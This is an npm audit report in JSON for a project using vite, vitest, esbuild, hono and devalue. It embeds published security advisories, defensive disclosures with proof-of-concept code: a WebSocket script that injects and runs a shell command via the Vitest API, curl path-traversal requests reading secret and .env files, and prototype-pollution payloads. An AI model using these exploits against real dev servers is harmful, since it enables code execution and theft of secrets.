{
  "actions": [
    {
      "action": "update",
      "resolves": [
        {
          "id": 1107323,
          "path": ".>vitest>vite",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1107327,
          "path": ".>vitest>vite",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1109131,
          "path": ".>vitest>vite",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ],
      "module": "vite",
      "target": "5.4.21",
      "depth": 3
    },
    {
      "action": "update",
      "resolves": [
        {
          "id": 1110996,
          "path": ".>@cloudflare/vitest-pool-workers>wrangler>selfsigned>node-forge",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1110998,
          "path": ".>@cloudflare/vitest-pool-workers>wrangler>selfsigned>node-forge",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1111068,
          "path": ".>@cloudflare/vitest-pool-workers>wrangler>selfsigned>node-forge",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ],
      "module": "node-forge",
      "target": "1.3.3",
      "depth": 5
    },
    {
      "action": "review",
      "module": "esbuild",
      "resolves": [
        {
          "id": 1102341,
          "path": ".>@cloudflare/vitest-pool-workers>esbuild",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1102341,
          "path": ".>vitest>vite>esbuild",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ]
    },
    {
      "action": "review",
      "module": "vitest",
      "resolves": [
        {
          "id": 1102430,
          "path": ".>vitest",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ]
    },
    {
      "action": "review",
      "module": "devalue",
      "resolves": [
        {
          "id": 1106997,
          "path": ".>@cloudflare/vitest-pool-workers>devalue",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ]
    },
    {
      "action": "review",
      "module": "hono",
      "resolves": [
        {
          "id": 1107268,
          "path": ".>hono",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1107532,
          "path": ".>hono",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1109151,
          "path": ".>hono",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1111032,
          "path": ".>hono",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ]
    }
  ],
  "advisories": {
    "1102341": {
      "findings": [
        {
          "version": "0.17.19",
          "paths": []
        },
        {
          "version": "0.21.5",
          "paths": []
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/evanw/esbuild/security/advisories/GHSA-67mh-4wv8-2f99\n- https://github.com/evanw/esbuild/commit/de85afd65edec9ebc44a11e245fd9e9a2e99760d\n- https://github.com/advisories/GHSA-67mh-4wv8-2f99",
      "created": "2025-02-10T17:48:07.000Z",
      "id": 1102341,
      "npm_advisory_id": null,
      "overview": "### Summary\n\nesbuild allows any websites to send any request to the development server and read the response due to default CORS settings.\n\n### Details\n\nesbuild sets `Access-Control-Allow-Origin: *` header to all requests, including the SSE connection, which allows any websites to send any request to the development server and read the response.\n\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L121\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L363\n\n**Attack scenario**:\n\n1. The attacker serves a malicious web page (`http://malicious.example.com`).\n1. The user accesses the malicious web page.\n1. The attacker sends a `fetch('http://127.0.0.1:8000/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.\n1. The attacker gets the content of `http://127.0.0.1:8000/main.js`.\n\nIn this scenario, I assumed that the attacker knows the URL of the bundle output file name. But the attacker can also get that information by\n\n- Fetching `/index.html`: normally you have a script tag here\n- Fetching `/assets`: it's common to have a `assets` directory when you have JS files and CSS files in a different directory and the directory listing feature tells the attacker the list of files\n- Connecting `/esbuild` SSE endpoint: the SSE endpoint sends the URL path of the changed files when the file is changed (`new EventSource('/esbuild').addEventListener('change', e => console.log(e.type, e.data))`)\n- Fetching URLs in the known file: once the attacker knows one file, the attacker can know the URLs imported from that file\n\nThe scenario above fetches the compiled content, but if the victim has the source map option enabled, the attacker can also get the non-compiled content by fetching the source map file.\n\n### PoC\n\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18561484/reproduction.zip)\n2. Extract it and move to that directory\n1. Run `npm i`\n1. Run `npm run watch`\n1. Run `fetch('http://127.0.0.1:8000/app.js').then(r => r.text()).then(content => console.log(content))` in a different website's dev tools.\n\n![image](https://github.com/user-attachments/assets/08fc2e4d-e1ec-44ca-b0ea-78a73c3c40e9)\n\n### Impact\n\nUsers using the serve feature may get the source code stolen by malicious websites.",
      "reported_by": null,
      "title": "esbuild enables any website to send any requests to the development server and read the response",
      "metadata": null,
      "cves": [],
      "access": "public",
      "severity": "moderate",
      "module_name": "esbuild",
      "vulnerable_versions": "<=0.24.2",
      "github_advisory_id": "GHSA-67mh-4wv8-2f99",
      "recommendation": "Upgrade to version 0.25.0 or later",
      "patched_versions": ">=0.25.0",
      "updated": "2025-02-10T17:48:08.000Z",
      "cvss": {
        "score": 5.3,
        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N"
      },
      "cwe": [
        "CWE-346"
      ],
      "url": "https://github.com/advisories/GHSA-67mh-4wv8-2f99"
    },
    "1102430": {
      "findings": [
        {
          "version": "1.5.0",
          "paths": []
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/vitest-dev/vitest/security/advisories/GHSA-9crc-q9x8-hgqq\n- https://github.com/vitest-dev/vitest/commit/191ef9e34c867d0efd04f49b3d38193a68e825dc\n- https://github.com/vitest-dev/vitest/commit/7ce9fbb4972d45c6fd34c843645ef6f549bbb241\n- https://github.com/vitest-dev/vitest/commit/e0fe1d81e2d4bcddb1c6ca3c5c3970d8ba697383\n- https://nvd.nist.gov/vuln/detail/CVE-2025-24964\n- https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46\n- https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76\n- https://vitest.dev/config/#api\n- https://github.com/advisories/GHSA-9crc-q9x8-hgqq",
      "created": "2025-02-04T17:00:57.000Z",
      "id": 1102430,
      "npm_advisory_id": null,
      "overview": "### Summary\nArbitrary remote Code Execution when accessing a malicious website while Vitest API server is listening by Cross-site WebSocket hijacking (CSWSH) attacks.\n\n### Details\nWhen [`api` option](https://vitest.dev/config/#api) is enabled (Vitest UI enables it), Vitest starts a WebSocket server. This WebSocket server did not check Origin header and did not have any authorization mechanism and was vulnerable to CSWSH attacks.\nhttps://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46\n\nThis WebSocket server has `saveTestFile` API that can edit a test file and `rerun` API that can rerun the tests. An attacker can execute arbitrary code by injecting a code in a test file by the `saveTestFile` API and then running that file by calling the `rerun` API.\nhttps://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76\n\n### PoC\n1. Open Vitest UI.\n2. Access a malicious web site with the script below.\n3. If you have `calc` executable in `PATH` env var (you'll likely have it if you are running on Windows), that application will be executed.\n\n```js\n// code from https://github.com/WebReflection/flatted\nconst Flatted=function(n){\"use strict\";function t(n){return t=\"function\"==typeof Symbol&&\"symbol\"==typeof Symbol.iterator?function(n){return typeof n}:function(n){return n&&\"function\"==typeof Symbol&&n.constructor===Symbol&&n!==Symbol.prototype?\"symbol\":typeof n},t(n)}var r=JSON.parse,e=JSON.stringify,o=Object.keys,u=String,f=\"string\",i={},c=\"object\",a=function(n,t){return t},l=function(n){return n instanceof u?u(n):n},s=function(n,r){return t(r)===f?new u(r):r},y=function n(r,e,f,a){for(var l=[],s=o(f),y=s.length,p=0;p<y;p++){var v=s[p],S=f[v];if(S instanceof u){var b=r[S];t(b)!==c||e.has(b)?f[v]=a.call(f,v,b):(e.add(b),f[v]=i,l.push({k:v,a:[r,e,b,a]}))}else f[v]!==i&&(f[v]=a.call(f,v,S))}for(var m=l.length,g=0;g<m;g++){var h=l[g],O=h.k,d=h.a;f[O]=a.call(f,O,n.apply(null,d))}return f},p=function(n,t,r){var e=u(t.push(r)-1);return n.set(r,e),e},v=function(n,e){var o=r(n,s).map(l),u=o[0],f=e||a,i=t(u)===c&&u?y(o,new Set,u,f):u;return f.call({\"\":i},\"\",i)},S=function(n,r,o){for(var u=r&&t(r)===c?function(n,t){return\"\"===n||-1<r.indexOf(n)?t:void 0}:r||a,i=new Map,l=[],s=[],y=+p(i,l,u.call({\"\":n},\"\",n)),v=!y;y<l.length;)v=!0,s[y]=e(l[y++],S,o);return\"[\"+s.join(\",\")+\"]\";function S(n,r){if(v)return v=!v,r;var e=u.call(this,n,r);switch(t(e)){case c:if(null===e)return e;case f:return i.get(e)||p(i,l,e)}return e}};return n.fromJSON=function(n){return v(e(n))},n.parse=v,n.stringify=S,n.toJSON=function(n){return r(S(n))},n}({});\n\n// actual code to run\nconst ws = new WebSocket('ws://localhost:51204/__vitest_api__')\nws.addEventListener('message', e => {\n    console.log(e.data)\n})\nws.addEventListener('open', () => {\n    ws.send(Flatted.stringify({ t: 'q', i: crypto.randomUUID(), m: \"getFiles\", a: [] }))\n\n    const testFilePath = \"/path/to/test-file/basic.test.ts\" // use a test file returned from the response of \"getFiles\"\n\n    // edit file content to inject command execution\n    ws.send(Flatted.stringify({\n      t: 'q',\n      i: crypto.randomUUID(),\n      m: \"saveTestFile\",\n      a: [testFilePath, \"import child_process from 'child_process';child_process.execSync('calc')\"]\n    }))\n    // rerun the tests to run the injected command execution code\n    ws.send(Flatted.stringify({\n      t: 'q',\n      i: crypto.randomUUID(),\n      m: \"rerun\",\n      a: [testFilePath]\n    }))\n})\n```\n\n### Impact\nThis vulnerability can result in remote code execution for users that are using Vitest serve API.",
      "reported_by": null,
      "title": "Vitest allows Remote Code Execution when accessing a malicious website while Vitest API server is listening",
      "metadata": null,
      "cves": [
        "CVE-2025-24964"
      ],
      "access": "public",
      "severity": "critical",
      "module_name": "vitest",
      "vulnerable_versions": ">=1.0.0 <1.6.1",
      "github_advisory_id": "GHSA-9crc-q9x8-hgqq",
      "recommendation": "Upgrade to version 1.6.1 or later",
      "patched_versions": ">=1.6.1",
      "updated": "2025-02-04T22:04:11.000Z",
      "cvss": {
        "score": 9.7,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H"
      },
      "cwe": [
        "CWE-1385"
      ],
      "url": "https://github.com/advisories/GHSA-9crc-q9x8-hgqq"
    },
    "1106997": {
      "findings": [
        {
          "version": "4.3.3",
          "paths": []
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/sveltejs/devalue/security/advisories/GHSA-vj54-72f3-p5jv\n- https://github.com/sveltejs/devalue/commit/0623a47c9555b639c03ff1baea82951b2d9d1132\n- https://nvd.nist.gov/vuln/detail/CVE-2025-57820\n- https://github.com/advisories/GHSA-vj54-72f3-p5jv",
      "created": "2025-08-26T22:33:14.000Z",
      "id": 1106997,
      "npm_advisory_id": null,
      "overview": "## 1. `devalue.parse` allows `__proto__` to be set\n\nA string passed to `devalue.parse` could represent an object with a `__proto__` property, which would assign a prototype to an object while allowing properties to be overwritten:\n\n```js\nclass Vector {\n  constructor(x, y) {\n    this.x = x;\n    this.y = y;\n  }\n\n  get magnitude() {\n    return (this.x ** 2 + this.y ** 2) ** 0.5;\n  }\n}\n\nconst payload = `[{\"x\":1,\"y\":2,\"magnitude\":3,\"__proto__\":4},3,4,\"nope\",[\"Vector\",5],[6,7],8,9]`;\n\nconst vector = devalue.parse(payload, {\n  Vector: ([x, y]) => new Vector(x, y)\n});\n\nconsole.log(\"Is vector\", vector instanceof Vector); // true\nconsole.log(vector.x) // 3\nconsole.log(vector.y) // 4\nconsole.log(vector.magnitude); // \"nope\" instead of 5\n```\n\n## 2. `devalue.parse` allows array prototype methods to be assigned to object\n\nIn a payload constructed with `devalue.stringify`, values are represented as array indices, where the array contains the 'hydrated' values:\n\n```js\ndevalue.stringify({ message: 'hello' }); // [{\"message\":1},\"hello\"]\n```\n\n`devalue.parse` does not check that an index is numeric, which means that it could assign an array prototype method to a property instead:\n\n```js\nconst object = devalue.parse('[{\"toString\":\"push\"}]');\nobject.toString(); // 0\n```\n\nThis could be used by a creative attacker to bypass server-side validation.",
      "reported_by": null,
      "title": "devalue prototype pollution vulnerability",
      "metadata": null,
      "cves": [
        "CVE-2025-57820"
      ],
      "access": "public",
      "severity": "high",
      "module_name": "devalue",
      "vulnerable_versions": "<5.3.2",
      "github_advisory_id": "GHSA-vj54-72f3-p5jv",
      "recommendation": "Upgrade to version 5.3.2 or later",
      "patched_versions": ">=5.3.2",
      "updated": "2025-08-27T14:27:09.000Z",
      "cvss": {
        "score": 0,
        "vectorString": null
      },
      "cwe": [
        "CWE-1321"
      ],
      "url": "https://github.com/advisories/GHSA-vj54-72f3-p5jv"
    },
    "1107268": {
      "findings": [
        {
          "version": "4.9.5",
          "paths": []
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/honojs/hono/security/advisories/GHSA-9hp6-4448-45g2\n- https://github.com/honojs/hono/commit/1d79aedc3f82d8c9969b115fe61bc4bd705ec8de\n- https://github.com/honojs/hono/releases/tag/v4.9.6\n- https://nvd.nist.gov/vuln/detail/CVE-2025-58362\n- https://github.com/advisories/GHSA-9hp6-4448-45g2",
      "created": "2025-09-03T21:30:13.000Z",
      "id": 1107268,
      "npm_advisory_id": null,
      "overview": "### Summary\n\nA flaw in the `getPath` utility function could allow path confusion and potential bypass of proxy-level ACLs (e.g. Nginx location blocks).\n\n### Details\n\nThe original implementation relied on fixed character offsets when parsing request URLs. Under certain malformed absolute-form Request-URIs, this could lead to incorrect path extraction.\n\nMost standards-compliant runtimes and reverse proxies reject such malformed requests with a 400 Bad Request, so the impact depends on the application and environment.\n\n### Impact\n\nIf proxy ACLs are used to protect sensitive endpoints such as `/admin`, this flaw could have allowed unauthorized access. The confidentiality impact depends on what data is exposed: if sensitive administrative data is exposed, the impact may be High (CVSS 7.5); otherwise it may be Medium (CVSS 5.3).\n\n### Resolution\n\nThe implementation has been updated to correctly locate the first slash after \"://\", preventing such path confusion.",
      "reported_by": null,
      "title": "Hono's flaw in URL path parsing could cause path confusion",
      "metadata": null,
      "cves": [
        "CVE-2025-58362"
      ],
      "access": "public",
      "severity": "high",
      "module_name": "hono",
      "vulnerable_versions": ">=4.8.0 <4.9.6",
      "github_advisory_id": "GHSA-9hp6-4448-45g2",
      "recommendation": "Upgrade to version 4.9.6 or later",
      "patched_versions": ">=4.9.6",
      "updated": "2025-09-05T16:11:30.000Z",
      "cvss": {
        "score": 7.5,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
      },
      "cwe": [
        "CWE-706"
      ],
      "url": "https://github.com/advisories/GHSA-9hp6-4448-45g2"
    },
    "1107323": {
      "findings": [
        {
          "version": "5.4.19",
          "paths": []
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-g4jq-h2w9-997c\n- https://nvd.nist.gov/vuln/detail/CVE-2025-58751\n- https://github.com/lukeed/sirv/commit/f0113f3f8266328d804ee808f763a3c11f8997eb\n- https://github.com/vitejs/vite/commit/09f2b52e8d5907f26602653caf41b3a56692600d\n- https://github.com/vitejs/vite/commit/4f1c35bcbb5830290c694aa14b6789e07450f069\n- https://github.com/vitejs/vite/commit/63e2a5d232218f3f8d852056751e609a5367aaec\n- https://github.com/vitejs/vite/commit/e11d24008b97d4ca731ecc1a3b95260a6d12e7e0\n- https://github.com/advisories/GHSA-g4jq-h2w9-997c",
      "created": "2025-09-09T20:55:56.000Z",
      "id": 1107323,
      "npm_advisory_id": null,
      "overview": "### Summary\nFiles starting with the same name with the public directory were served bypassing the `server.fs` settings.\n\n### Impact\nOnly apps that match the following conditions are affected:\n\n- explicitly exposes the Vite dev server to the network (using --host or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host))\n- uses [the public directory feature](https://vite.dev/guide/assets.html#the-public-directory) (enabled by default)\n- a symlink exists in the public directory\n\n### Details\nThe [servePublicMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L79) function is in charge of serving public files from the server. It returns the [viteServePublicMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L106) function which runs the needed tests and serves the page. The viteServePublicMiddleware function [checks if the publicFiles variable is defined](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L111), and then uses it to determine if the requested page is public. In the case that the publicFiles is undefined, the code will treat the requested page as a public page, and go on with the serving function. [publicFiles may be undefined if there is a symbolic link anywhere inside the public directory](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/publicDir.ts#L21). In that case, every requested page will be passed to the public serving function. The serving function is based on the [sirv](https://github.com/lukeed/sirv) library. Vite patches the library to add the possibility to test loading access to pages, but when the public page middleware [disables this functionality](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L89) since public pages are meant to be available always, regardless of whether they are in the allow or deny list.\n\nIn the case of public pages, the serving function is [provided with the path to the public directory](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L85) as a root directory. The code of the sirv library [uses the join function to get the full path to the requested file](https://github.com/lukeed/sirv/blob/d061616827dd32d53b61ec9530c9445c8f592620/packages/sirv/index.mjs#L42). For example, if the public directory is \"/www/public\", and the requested file is \"myfile\", the code will join them to the string \"/www/public/myfile\". The code will then pass this string to the normalize function. Afterwards, the code will [use the string's startsWith function](https://github.com/lukeed/sirv/blob/d061616827dd32d53b61ec9530c9445c8f592620/packages/sirv/index.mjs#L43) to determine whether the created path is within the given directory or not. Only if it is, it will be served.\n\nSince [sirv trims the trailing slash of the public directory](https://github.com/lukeed/sirv/blob/d061616827dd32d53b61ec9530c9445c8f592620/packages/sirv/index.mjs#L119), the string's startsWith function may return true even if the created path is not within the public directory. For example, if the server's root is at \"/www\", and the public directory is at \"/www/p\", if the created path will be \"/www/private.txt\", the startsWith function will still return true, because the string \"/www/private.txt\" starts with  \"/www/p\". To achieve this, the attacker will use \"..\" to ask for the file \"../private.txt\". The code will then join it to the \"/www/p\" string, and will receive \"/www/p/../private.txt\". Then, the normalize function will return \"/www/private.txt\", which will then be passed to the startsWith function, which will return true, and the processing of the page will continue without checking the deny list (since this is the public directory middleware which doesn't check that).\n\n### PoC\nExecute the following shell commands:\n\n```\nnpm  create  vite@latest\ncd vite-project/\nmkdir p\ncd p\nln -s a b\ncd ..\necho  'import path from \"node:path\"; import { defineConfig } from \"vite\"; export default defineConfig({publicDir: path.resolve(__dirname, \"p/\"), server: {fs: {deny: [path.resolve(__dirname, \"private.txt\")]}}})' > vite.config.js\necho  \"secret\" > private.txt\nnpm install\nnpm run dev\n```\n\nThen, in a different shell, run the following command:\n\n`curl -v --path-as-is 'http://localhost:5173/private.txt'`\n\nYou will receive a 403 HTTP Response,  because private.txt is denied.\n\nNow in the same shell run the following command:\n\n`curl -v --path-as-is 'http://localhost:5173/../private.txt'`\n\nYou will receive the contents of private.txt.\n\n### Related links\n- https://github.com/lukeed/sirv/commit/f0113f3f8266328d804ee808f763a3c11f8997eb",
      "reported_by": null,
      "title": "Vite middleware may serve files starting with the same name with the public directory",
      "metadata": null,
      "cves": [
        "CVE-2025-58751"
      ],
      "access": "public",
      "severity": "low",
      "module_name": "vite",
      "vulnerable_versions": "<=5.4.19",
      "github_advisory_id": "GHSA-g4jq-h2w9-997c",
      "recommendation": "Upgrade to version 5.4.20 or later",
      "patched_versions": ">=5.4.20",
      "updated": "2025-09-09T20:55:57.000Z",
      "cvss": {
        "score": 0,
        "vectorString": null
      },
      "cwe": [
        "CWE-22",
        "CWE-200",
        "CWE-284"
      ],
      "url": "https://github.com/advisories/GHSA-g4jq-h2w9-997c"
    },
    "1107327": {
      "findings": [
        {
          "version": "5.4.19",
          "paths": []
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-jqfw-vq24-v9c3\n- https://nvd.nist.gov/vuln/detail/CVE-2025-58752\n- https://github.com/vitejs/vite/commit/0ab19ea9fcb66f544328f442cf6e70f7c0528d5f\n- https://github.com/vitejs/vite/commit/14015d794f69accba68798bd0e15135bc51c9c1e\n- https://github.com/vitejs/vite/commit/482000f57f56fe6ff2e905305100cfe03043ddea\n- https://github.com/vitejs/vite/commit/6f01ff4fe072bcfcd4e2a84811772b818cd51fe6\n- https://github.com/vitejs/vite/blob/v7.1.5/packages/vite/CHANGELOG.md\n- https://github.com/advisories/GHSA-jqfw-vq24-v9c3",
      "created": "2025-09-09T20:54:42.000Z",
      "id": 1107327,
      "npm_advisory_id": null,
      "overview": "### Summary\nAny HTML files on the machine were served regardless of the `server.fs` settings.\n\n### Impact\n\nOnly apps that match the following conditions are affected:\n\n- explicitly exposes the Vite dev server to the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host))\n- `appType: 'spa'` (default) or `appType: 'mpa'` is used\n\nThis vulnerability also affects the preview server. The preview server allowed HTML files not under the output directory to be served.\n\n### Details\nThe [serveStaticMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L123) function is in charge of serving static files from the server. It returns the [viteServeStaticMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L136) function which runs the needed tests and serves the page. The viteServeStaticMiddleware function [checks if the extension of the requested file is \".html\"](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L144). If so, it doesn't serve the page. Instead, the server will go on to the next middlewares, in this case [htmlFallbackMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/htmlFallback.ts#L14), and then to [indexHtmlMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/indexHtml.ts#L438). These middlewares don't perform any test against allow or deny rules, and they don't make sure that the accessed file is in the root directory of the server. They just find the file and send back its contents to the client.\n\n### PoC\nExecute the following shell commands:\n\n```\nnpm  create  vite@latest\ncd vite-project/\necho  \"secret\" > /tmp/secret.html\nnpm install\nnpm run dev\n```\n\nThen, in a different shell, run the following command:\n\n`curl  -v  --path-as-is  'http://localhost:5173/../../../../../../../../../../../tmp/secret.html'`\n\nThe contents of /tmp/secret.html will be returned.\n\nThis will also work for HTML files that are in the root directory of the project, but are in the deny list (or not in the allow list). Test that by stopping the running server (CTRL+C), and running the following commands in the server's shell:\n\n```\necho  'import path from \"node:path\"; import { defineConfig } from \"vite\"; export default defineConfig({server: {fs: {deny: [path.resolve(__dirname, \"secret_files/*\")]}}})'  >  [vite.config.js](http://vite.config.js)\nmkdir secret_files\necho \"secret txt\" > secret_files/secret.txt\necho \"secret html\" > secret_files/secret.html\nnpm run dev\n\n```\n\nThen, in a different shell, run the following command:\n\n`curl  -v  --path-as-is  'http://localhost:5173/secret_files/secret.txt'`\n\nYou will receive a 403 HTTP Response,  because everything in the secret_files directory is denied.\n\nNow in the same shell run the following command:\n\n`curl  -v  --path-as-is  'http://localhost:5173/secret_files/secret.html'`\n\nYou will receive the contents of secret_files/secret.html.",
      "reported_by": null,
      "title": "Vite's `server.fs` settings were not applied to HTML files",
      "metadata": null,
      "cves": [
        "CVE-2025-58752"
      ],
      "access": "public",
      "severity": "low",
      "module_name": "vite",
      "vulnerable_versions": "<=5.4.19",
      "github_advisory_id": "GHSA-jqfw-vq24-v9c3",
      "recommendation": "Upgrade to version 5.4.20 or later",
      "patched_versions": ">=5.4.20",
      "updated": "2025-09-09T20:54:43.000Z",
      "cvss": {
        "score": 0,
        "vectorString": null
      },
      "cwe": [
        "CWE-23",
        "CWE-200",
        "CWE-284"
      ],
      "url": "https://github.com/advisories/GHSA-jqfw-vq24-v9c3"
    },
    "1107532": {
      "findings": [
        {
          "version": "4.9.5",
          "paths": []
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/honojs/hono/security/advisories/GHSA-92vj-g62v-jqhh\n- https://nvd.nist.gov/vuln/detail/CVE-2025-59139\n- https://github.com/honojs/hono/commit/605c70560b52f13af10379f79b76717042fafe8d\n- https://github.com/advisories/GHSA-92vj-g62v-jqhh",
      "created": "2025-09-12T21:12:20.000Z",
      "id": 1107532,
      "npm_advisory_id": null,
      "overview": "### Summary\nA flaw in the `bodyLimit` middleware could allow bypassing the configured request body size limit when conflicting HTTP headers were present.\n\n### Details\nThe middleware previously prioritized the `Content-Length` header even when a `Transfer-Encoding: chunked` header was also included. According to the HTTP specification, `Content-Length` must be ignored in such cases. This discrepancy could allow oversized request bodies to bypass the configured limit.\n\nMost standards-compliant runtimes and reverse proxies may reject such malformed requests with `400 Bad Request`, so the practical impact depends on the runtime and deployment environment.\n\n### Impact\nIf body size limits are used as a safeguard against large or malicious requests, this flaw could allow attackers to send oversized request bodies. The primary risk is denial of service (DoS) due to excessive memory or CPU consumption when handling very large requests.\n\n### Resolution\nThe implementation has been updated to align with the HTTP specification, ensuring that `Transfer-Encoding` takes precedence over `Content-Length`. The issue is fixed in Hono v4.9.7, and all users should upgrade immediately.",
      "reported_by": null,
      "title": "Hono has Body Limit Middleware Bypass",
      "metadata": null,
      "cves": [
        "CVE-2025-59139"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "hono",
      "vulnerable_versions": "<4.9.7",
      "github_advisory_id": "GHSA-92vj-g62v-jqhh",
      "recommendation": "Upgrade to version 4.9.7 or later",
      "patched_versions": ">=4.9.7",
      "updated": "2025-09-12T21:12:21.000Z",
      "cvss": {
        "score": 5.3,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
      },
      "cwe": [
        "CWE-400",
        "CWE-770"
      ],
      "url": "https://github.com/advisories/GHSA-92vj-g62v-jqhh"
    },
    "1109131": {
      "findings": [
        {
          "version": "5.4.19",
          "paths": []
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-93m4-6634-74q7\n- https://github.com/vitejs/vite/commit/f479cc57c425ed41ceb434fecebd63931b1ed4ed\n- https://nvd.nist.gov/vuln/detail/CVE-2025-62522\n- https://github.com/advisories/GHSA-93m4-6634-74q7",
      "created": "2025-10-20T19:54:28.000Z",
      "id": 1109131,
      "npm_advisory_id": null,
      "overview": "### Summary\nFiles denied by [`server.fs.deny`](https://vitejs.dev/config/server-options.html#server-fs-deny) were sent if the URL ended with `\\` when the dev server is running on Windows.\n\n### Impact\nOnly apps that match the following conditions are affected:\n\n- explicitly exposes the Vite dev server to the network (using --host or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host))\n- running the dev server on Windows\n\n### Details\n`server.fs.deny` can contain patterns matching against files (by default it includes `.env`, `.env.*`, `*.{crt,pem}` as such patterns). These patterns were able to bypass by using a back slash(`\\`). The root cause is that `fs.readFile('/foo.png/')` loads `/foo.png`.\n\n### PoC\n```shell\nnpm create vite@latest\ncd vite-project/\ncat \"secret\" > .env\nnpm install\nnpm run dev\ncurl --request-target /.env\\ http://localhost:5173\n```\n<img width=\"1593\" height=\"616\" alt=\"image\" src=\"https://github.com/user-attachments/assets/36212f4e-1d3c-4686-b16f-16b35ca9e175\" />",
      "reported_by": null,
      "title": "vite allows server.fs.deny bypass via backslash on Windows",
      "metadata": null,
      "cves": [
        "CVE-2025-62522"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "vite",
      "vulnerable_versions": ">=5.2.6 <=5.4.20",
      "github_advisory_id": "GHSA-93m4-6634-74q7",
      "recommendation": "Upgrade to version 5.4.21 or later",
      "patched_versions": ">=5.4.21",
      "updated": "2025-10-21T14:51:26.000Z",
      "cvss": {
        "score": 0,
        "vectorString": null
      },
      "cwe": [
        "CWE-22"
      ],
      "url": "https://github.com/advisories/GHSA-93m4-6634-74q7"
    },
    "1109151": {
      "findings": [
        {
          "version": "4.9.5",
          "paths": []
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/honojs/hono/security/advisories/GHSA-m732-5p4w-x69g\n- https://github.com/honojs/hono/commit/45ba3bf9e3dff8e4bd85d6b47d4b71c8d6c66bef\n- https://nvd.nist.gov/vuln/detail/CVE-2025-62610\n- https://github.com/advisories/GHSA-m732-5p4w-x69g",
      "created": "2025-10-22T15:21:18.000Z",
      "id": 1109151,
      "npm_advisory_id": null,
